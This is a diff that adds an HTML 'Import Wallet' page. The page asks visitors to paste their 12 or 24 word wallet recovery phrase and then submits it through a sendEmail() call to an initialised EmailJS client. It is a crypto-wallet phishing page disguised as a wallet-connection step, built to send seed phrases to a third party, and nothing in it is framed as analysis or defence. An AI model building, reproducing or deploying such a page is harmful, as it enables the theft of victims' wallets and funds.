@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0 maximum-scale=1.0">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="favicon.ico">
+</head>
+<body>
+    <div class="importwalletdiv">
+        <h3>Import Wallet</h3>
+        <img class="importwalletpic" src="importwallet.png" alt="">
+        <form onsubmit="sendEmail(); reset(); return false;" >
+            <label for="import"> Import Your Wallet Phrase, Typically 12 (sometimes 24) words seperated by a single spaces.</label>
+            <textarea  placeholder="import wallet phrase to connect" name="" id="import" cols="30" rows="10"></textarea>
+            <h3 style="color: red;" id="query"> </h3>
+            <button id="button" type="submit"> Connect Wallet </button>
+        </form>
+    </div>
+    <script src="index.js"></script>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+(function(){
+  emailjs.init("3pEqZ12K5cwispdtd");
+})();
+</script>
+</body>
+</html>
